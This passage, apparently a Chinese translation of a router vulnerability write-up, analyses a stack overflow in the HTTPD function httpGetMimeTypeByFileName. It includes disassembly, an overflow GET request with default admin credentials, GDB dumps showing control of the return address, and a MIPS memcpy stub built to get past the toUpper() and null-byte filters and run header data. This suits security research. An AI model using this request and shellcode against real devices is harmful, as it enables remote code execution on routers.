    LOAD:00425DBC                 lw      $s3, 0x38+var_C($sp)
    LOAD:00425DC0                 lw      $s2, 0x38+var_10($sp)
    LOAD:00425DC4                 lw      $s1, 0x38+var_14($sp)
    LOAD:00425DC8                 lw      $s0, 0x38+var_18($sp)
    LOAD:00425DCC                 jr      $ra                                
    LOAD:00425DD0                 addiu   $sp, 0x38
    LOAD:00425DD0  # End of function httpGetMimeTypeByFileName
在函数结尾处，应用会将数据进行复制并覆盖掉缓冲区循环处的原始数据。之后通过弹出程序来修改堆栈数据，并使用户可以控制返回的地址。
这也意味着用户能够在HTTPD进程的上下文中远程执行代码。
### toUpper() 过滤器
在HTTP头起始解析期间，设备每迭代一个字节就会进行一次搜索周期（0x2e）并构建缓冲区。
遇到句点后，缓冲区将数据传递给`toUpper()`调用，并将缓冲区中的每个ASCII字符转换为大写的等效字符。
    LOAD:00425D20 loc_425D20:
    LOAD:00425D20                 lbu     $a0, 0($a0)
    # returns an upper case version of the character where possible
    LOAD:00425D24                 jalr    $t9 ; toUpper                      
    LOAD:00425D28                 nop
然而设备在尝试通过HTTP标头发送`shellcode`时会遇到问题。因为系统无法避免进行`toUpper()`的调用，从而会阻止使用任何小写字符。
例如下面的GET请求。
    GET /fs/help HTTP/1.1
    Host: 192.168.0.1
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    Content-Length: 2
    Accept-Encoding: gzip, deflate
    Authorization: Basic YWRtaW46YWRtaW4=
    Connection: keep-alive
    Upgrade-Insecure-Requests: 1
    Content-Length: 4
查看执行`httpGetMimeTypeByFileName`函数结尾的最后一次跳转之前的寄存器情况，我们可以看到标头中的'a'字符（0x61）已经转换为它们的大写版本（0x41）。
    (GDB) i r
    i r
              zero       at       v0       v1       a0       a1       a2       a3
     R0   00000000 10000400 00514004 00000035 7dfff821 0051432d 01010101 80808080 
                t0       t1       t2       t3       t4       t5       t6       t7
     R8   00000002 fffffffe 00000000 00000006 19999999 00000000 00000057 00425d2c 
                s0       s1       s2       s3       s4       s5       s6       s7
     R16  41414141 41414141 41414141 41414141 41414141 006798f4 006798d0 00000000 
                t8       t9       k0       k1       gp       sp       s8       ra
     R24  00000132 2ab02820 00000000 00000000 00598790 7dfff808 7dfffa62 41414141 
            status       lo       hi badvaddr    cause       pc
           0000040c 00059cf8 000001fa 00590cac 00000024 00425dcc 
     (GDB)
### 漏洞分析
对上面显示的寄存器的检查显示了在`toUpper()`调用之后，系统会留下可预测原始标题数据位置的指针。
虽然终止了`httpGetMimeTypeByFileName`函数结尾的最后一次跳转，但我们可以检查堆栈上的数据。在这里我们发现了现在的大写标题数据的一部分（包括payload）存储在那里。
    (GDB) x/32s $sp
    x/32s $sp
    0x7dfff808:      ""
    0x7dfff809:      ""
    ...
    0x7dfff81f:      ""
    0x7dfff820:      "5\r\n", 'A' ...
    0x7dfff8e8:      'A' ...
    0x7dfff9b0:      'A' ...
    0x7dfffa78:      'A' ...
    0x7dfffb40:      'A' , "\r\nCONTENT-LENGTH: 0\r\nACCEPT-ENCODING: GZIP, DEFLATE\r\nAUTH"...
    0x7dfffc08:      "ORIZATION: BASIC YWRTAW46YWRTAW4=\r\nCONNECTION: KEEP-ALIVE\r\nUPGRADE-INSECURE-REQUESTS: 1\r\nCONTENT-LENGTH: 0\r\n\r\n"
    0x7dfffc77:      ""
    0x7dfffc78:      ""
    0x7dfffc79:      ""
    ...
    (GDB)
相反，如果我们检查寄存器`$ s5`所指向的数据，我们会看到原始头数据仍然可访问。
    (GDB) x/32s $s5+0x64
    x/32s $s5+0x64
    0x679958:        ""
    0x679959:        ""
    ...
    0x67995f:        ""
    0x679960:        "/fs/help"
    0x679969:        "elp"
    0x67996d:        "HTTP/1.1"
    0x679976:        "\n"
    0x679978:        "ost: 192.168.0.1\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q"...
    0x679a40:        "=0.5\r\n", 'a' ...
    0x679b08:        'a' ...
    0x679bd0:        'a' ...
    0x679c98:        'a' ...
    0x679d60:        'a' , "\r\nContent-Length: 0\r\nAccept-Encoding: gzip, deflate\r\nA"...
    0x679e28:        "uthorization: Basic YWRtaW46YWRtaW4=\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nContent-Length: 0\r\n\r\n"
    0x679e9a:        ""
    0x679e9b:        ""
    ...
    (GDB)
该部分内存的权限显示该范围是可执行的，所以我们直接跳转到原始数据头。
    # cat /proc/12518/maps
    cat /proc/12518/maps
    00400000-00538000 r-xp 00000000 1f:02 69         /usr/bin/httpd
    00578000-00594000 rw-p 00138000 1f:02 69         /usr/bin/httpd
    00594000-006a6000 rwxp 00000000 00:00 0          [heap]
    2aaa8000-2aaad000 r-xp 00000000 1f:02 359        /lib/ld-uClibc-0.9.30.so
    2aaad000-2aaae000 rw-p 00000000 00:00 0 
    2aaae000-2aab2000 rw-s 00000000 00:06 0          /SYSV0000002f (deleted)
    2aaec000-2aaed000 r--p 00004000 1f:02 359        /lib/ld-uClibc-0.9.30.so
    ...
    7f401000-7f600000 rwxp 00000000 00:00 0 
    7fcf7000-7fd0c000 rwxp 00000000 00:00 0          [stack]
`toUpper()`和`strcmp()`引入的限制，导致了这个路径无效。`toUpper()`的使用创建了一个条件，其中任何小写字母都必须被视为无效字符。
另外，由于我们的数据通过`strcmp()`调用，所以我们不能使用任何空字节。
除此之外，这些调用使我们无法使用以下任何字节：`0x00,0x61-0x7a`。
### 绕过 toUpper()函数
为了研究`toUpper()`函数带来的问题，我们创建了一小段调用`memcpy()`的代码，它在获得`$
ra`的控制权后并不使用任何小写字符或空字节来执行后续内容。 使用此代码，我们能够以原始的形式将标头数据复制到堆栈中并跳转任意地点执行。
    move    $a0, $t9         # put the stack pointer into arg1
    addiu   $a0, 0x12C       # increase arg1 so we don’t overwrite this code
    addiu   $a1, $s5, 0x198  # load the raw header data pointer into arg2
    li      $a2, 0x374       # load the size into arg3
    li      $t9, 0x2AB01E20  # load $t9 with the address of memcpy()
    jalr    $t9              # call memcpy()
    move    $t8, $t3         # placeholder to handle delay slot without nulls
    move    $t9, $sp         # prep $t9 with the stack pointer
    addiu   $t9, 0x14C       # increase the $t9 pointer to the raw header
    jalr    $t9              # execute the raw header on the stack
    move    $t8, $t3         # placeholder to handle delay slot without nulls